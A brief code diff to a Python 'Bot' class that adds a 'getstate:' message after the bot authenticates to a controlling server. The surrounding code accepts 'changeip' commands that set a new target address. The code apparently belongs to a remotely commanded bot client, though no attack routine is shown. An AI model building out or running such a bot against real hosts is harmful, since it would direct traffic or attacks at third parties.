@@ -77,6 +77,7 @@ class Bot():
 						elif request[1] == 'success': 
 							self.authenticated = True
 							print(f'authenticated as bot')
+							self.sock.send("getstate:")
 					elif request[0] == 'changeip':                              #did they decide to include port?
 						self.target_address = request[1]
 						print(f'new target received {self.target_address}')
